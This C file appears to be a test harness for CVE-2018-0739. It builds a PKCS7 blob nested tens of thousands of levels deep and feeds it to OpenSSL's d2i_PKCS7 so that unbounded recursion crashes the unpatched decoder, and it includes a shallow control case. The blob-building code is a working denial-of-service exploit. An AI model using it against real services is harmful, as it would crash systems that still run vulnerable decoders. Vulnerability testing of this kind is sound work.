/* SPDX-License-Identifier: Apache-2.0 */
/*
 * CVE-2018-0739 - stack exhaustion from unbounded recursion in the ASN.1
 * template decoder on a recursively-defined type (PKCS7). d2i_PKCS7 descends
 * ContentInfo -> SignedData -> contents(ContentInfo) -> ... once per nesting
 * level, with no depth limit, so a deeply nested blob overflows the stack.
 * Fix: 9310d45087 (crypto/asn1/tasn_dec.c) caps recursion at
 * ASN1_MAX_CONSTRUCTED_NEST (30). Reachable via javacrypto d2i_PKCS7_bio
 * (NC:4917, CertificateFactory PKCS#7) and racoon d2i_PKCS7 (oakley.c:2179).
 *
 * The blob is KKTLS_ASN1_DEPTH (default 60000) nested pkcs7-signedData
 * ContentInfos wrapping an innermost pkcs7-data, built with indefinite-length
 * (BER) constructed encoding so construction is O(depth) and no length has to
 * be recomputed. The decoder recurses into each level's content before it
 * unwinds, overflowing the stack (SIGSEGV) on the unfixed decoder.
 *
 * attack : the full-depth blob -> crash.
 * control: a shallow (3-level) blob; d2i_PKCS7 returns without crashing.
 */
#include <openssl/pkcs7.h>
#include <openssl/asn1.h>
#include <stdlib.h>
#include <string.h>
#include "../cve_common.h"

/*
 * One nesting level, indefinite length:
 *   30 80                              ContentInfo SEQUENCE (indefinite)
 *   06 09 2a 86 48 86 f7 0d 01 07 02   OID pkcs7-signedData
 *   A0 80                              [0] EXPLICIT content (indefinite)
 *   30 80                              SignedData SEQUENCE (indefinite)
 *   02 01 01                           version INTEGER 1
 *   31 00                              digestAlgorithms SET OF (empty)
 *     <inner ContentInfo>              contents  <-- recursion point
 *   00 00 00 00 00 00                  EOC x3 (SignedData, [0], ContentInfo)
 */
static const unsigned char LEVEL_PREFIX[] = {
    0x30, 0x80,
    0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02,
    0xA0, 0x80,
    0x30, 0x80,
    0x02, 0x01, 0x01,
    0x31, 0x00
};
static const unsigned char LEVEL_SUFFIX[] = { 0, 0, 0, 0, 0, 0 };

/* innermost: ContentInfo of type pkcs7-data (indefinite, empty content) */
static const unsigned char INNER[] = {
    0x30, 0x80,
    0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01,
    0x00, 0x00
};

int main(int argc, char **argv)
{
    int ctl = cve_is_control(argc, argv);
    const char *env = getenv("KKTLS_ASN1_DEPTH");
    long depth = ctl ? 3 : (env ? atol(env) : 60000);
    long i;
    size_t plen = sizeof(LEVEL_PREFIX), slen = sizeof(LEVEL_SUFFIX);
    size_t total = (size_t)depth * (plen + slen) + sizeof(INNER);
    unsigned char *buf = malloc(total), *q = buf;
    const unsigned char *p;
    PKCS7 *pk;

    for (i = 0; i < depth; i++) { memcpy(q, LEVEL_PREFIX, plen); q += plen; }
    memcpy(q, INNER, sizeof(INNER)); q += sizeof(INNER);
    for (i = 0; i < depth; i++) { memcpy(q, LEVEL_SUFFIX, slen); q += slen; }

    printf("decoding %ld-deep PKCS7 (%zu bytes)\n", depth, total);
    fflush(stdout);
    p = buf;
    cve_call("d2i_PKCS7");
    pk = d2i_PKCS7(NULL, &p, (long)total);   /* stack overflow here on baseline */
    cve_reached("d2i_PKCS7");
    printf("d2i_PKCS7 returned %s\n", pk ? "non-NULL" : "NULL");
    if (pk)
        PKCS7_free(pk);
    free(buf);
    return 0;
}
